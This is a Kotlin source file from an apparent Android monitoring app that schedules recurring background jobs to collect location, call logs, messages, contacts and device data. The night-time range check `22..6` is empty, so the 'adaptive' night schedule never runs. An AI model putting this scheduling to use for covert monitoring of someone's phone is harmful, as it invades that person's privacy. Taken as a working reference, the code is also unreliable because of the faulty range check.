package com.mshomeguardian.logger.workers

import android.content.Context
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.mshomeguardian.logger.utils.OptimizedLogger
import java.util.Calendar
import java.util.concurrent.TimeUnit

/**
 * Optimized WorkerScheduler with intelligent scheduling and reduced frequency
 */
object WorkerScheduler {
    private const val TAG = "WorkerScheduler"

    // Optimized work names
    private const val LOCATION_WORK_NAME = "OptimizedLocationWork"
    private const val CALL_LOG_WORK_NAME = "OptimizedCallLogWork"
    private const val MESSAGE_WORK_NAME = "OptimizedMessageWork"
    private const val CONTACTS_WORK_NAME = "OptimizedContactsWork"
    private const val DEVICE_INFO_WORK_NAME = "OptimizedDeviceInfoWork"
    private const val WEATHER_WORK_NAME = "OptimizedWeatherWork"
    private const val RECORDING_CLEANUP_WORK_NAME = "OptimizedRecordingCleanupWork"

    /**
     * Schedule all workers with intelligent frequency
     */
    fun schedule(context: Context) {
        try {
            OptimizedLogger.d(TAG, "Scheduling optimized workers")

            // Get adaptive intervals based on time of day
            val intervals = getAdaptiveIntervals()

            scheduleLocationWork(context, intervals.locationInterval)
            scheduleCallLogWork(context, intervals.communicationInterval)
            scheduleMessageWork(context, intervals.communicationInterval)
            scheduleContactsWork(context, intervals.contactsInterval)
            scheduleDeviceInfoWork(context, intervals.deviceInfoInterval)
            scheduleWeatherWork(context, intervals.weatherInterval)
            scheduleRecordingCleanupWork(context)

            OptimizedLogger.d(TAG, "All optimized workers scheduled successfully")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling workers", e)
        }
    }

    /**
     * Get adaptive intervals based on time of day and usage patterns
     */
    private fun getAdaptiveIntervals(): WorkerIntervals {
        val currentHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)

        return when {
            currentHour in 22..6 -> {
                // Night mode: reduced frequency
                WorkerIntervals(
                    locationInterval = 60L,      // 1 hour
                    communicationInterval = 60L,  // 1 hour
                    contactsInterval = 360L,      // 6 hours
                    deviceInfoInterval = 720L,    // 12 hours
                    weatherInterval = 120L        // 2 hours
                )
            }
            currentHour in 9..17 -> {
                // Work hours: normal frequency
                WorkerIntervals(
                    locationInterval = 30L,       // 30 minutes
                    communicationInterval = 15L,  // 15 minutes
                    contactsInterval = 120L,      // 2 hours
                    deviceInfoInterval = 360L,    // 6 hours
                    weatherInterval = 60L         // 1 hour
                )
            }
            else -> {
                // Evening/morning: balanced frequency
                WorkerIntervals(
                    locationInterval = 20L,       // 20 minutes
                    communicationInterval = 20L,  // 20 minutes
                    contactsInterval = 180L,      // 3 hours
                    deviceInfoInterval = 480L,    // 8 hours
                    weatherInterval = 90L         // 1.5 hours
                )
            }
        }
    }

    /**
     * Create optimized constraints for better battery life
     */
    private fun createOptimizedConstraints(): Constraints {
        return Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .setRequiresDeviceIdle(false) // Don't wait for idle to improve responsiveness
            .build()
    }

    private fun scheduleLocationWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val locationWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                LOCATION_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                locationWorkRequest
            )

            OptimizedLogger.d(TAG, "Location worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling location worker", e)
        }
    }

    private fun scheduleCallLogWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val callLogWorkRequest = PeriodicWorkRequestBuilder<CallLogWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                CALL_LOG_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                callLogWorkRequest
            )

            OptimizedLogger.d(TAG, "Call log worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling call log worker", e)
        }
    }

    private fun scheduleMessageWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val messageWorkRequest = PeriodicWorkRequestBuilder<MessageWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                MESSAGE_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                messageWorkRequest
            )

            OptimizedLogger.d(TAG, "Message worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling message worker", e)
        }
    }

    private fun scheduleContactsWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val contactsWorkRequest = PeriodicWorkRequestBuilder<ContactsWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 2, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                CONTACTS_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                contactsWorkRequest
            )

            OptimizedLogger.d(TAG, "Contacts worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling contacts worker", e)
        }
    }

    private fun scheduleDeviceInfoWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val deviceInfoWorkRequest = PeriodicWorkRequestBuilder<DeviceInfoWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 5, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                DEVICE_INFO_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                deviceInfoWorkRequest
            )

            OptimizedLogger.d(TAG, "Device info worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling device info worker", e)
        }
    }

    private fun scheduleWeatherWork(context: Context, intervalMinutes: Long) {
        try {
            val constraints = createOptimizedConstraints()

            val weatherWorkRequest = PeriodicWorkRequestBuilder<WeatherWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 2, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WEATHER_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                weatherWorkRequest
            )

            OptimizedLogger.d(TAG, "Weather worker scheduled (${intervalMinutes}m interval)")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling weather worker", e)
        }
    }

    private fun scheduleRecordingCleanupWork(context: Context) {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                .setRequiresBatteryNotLow(true)
                .setRequiresCharging(true) // Only during charging
                .build()

            val cleanupWorkRequest = PeriodicWorkRequestBuilder<RecordingCleanupWorker>(
                1, TimeUnit.DAYS
            )
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                RECORDING_CLEANUP_WORK_NAME,
                ExistingPeriodicWorkPolicy.UPDATE,
                cleanupWorkRequest
            )

            OptimizedLogger.d(TAG, "Recording cleanup worker scheduled")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error scheduling recording cleanup worker", e)
        }
    }

    /**
     * Run critical workers immediately with optimized constraints
     */
    fun runCriticalWorkersOnce(context: Context) {
        try {
            OptimizedLogger.d(TAG, "Running critical workers once")

            val workManager = WorkManager.getInstance(context)
            val constraints = createOptimizedConstraints()

            // Only run the most critical workers
            val criticalWorkers = listOf(
                OneTimeWorkRequestBuilder<LocationWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<DeviceInfoWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<WeatherWorker>().setConstraints(constraints).build()
            )

            criticalWorkers.forEach { workManager.enqueue(it) }
            OptimizedLogger.d(TAG, "Critical workers enqueued successfully")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error running critical workers", e)
        }
    }

    /**
     * Run all workers immediately (for manual sync)
     */
    fun runAllWorkersOnce(context: Context) {
        try {
            OptimizedLogger.d(TAG, "Running all workers once")

            val workManager = WorkManager.getInstance(context)
            val constraints = createOptimizedConstraints()

            val workers = listOf(
                OneTimeWorkRequestBuilder<LocationWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<CallLogWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<MessageWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<ContactsWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<DeviceInfoWorker>().setConstraints(constraints).build(),
                OneTimeWorkRequestBuilder<WeatherWorker>().setConstraints(constraints).build()
            )

            workers.forEach { workManager.enqueue(it) }
            OptimizedLogger.d(TAG, "All workers enqueued successfully")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error running all workers", e)
        }
    }

    /**
     * Cancel all work efficiently
     */
    fun cancelAllWork(context: Context) {
        try {
            WorkManager.getInstance(context).cancelAllWork()
            OptimizedLogger.d(TAG, "All work cancelled")
        } catch (e: Exception) {
            OptimizedLogger.e(TAG, "Error cancelling work", e)
        }
    }

    /**
     * Data class for worker intervals
     */
    private data class WorkerIntervals(
        val locationInterval: Long,
        val communicationInterval: Long,
        val contactsInterval: Long,
        val deviceInfoInterval: Long,
        val weatherInterval: Long
    )
}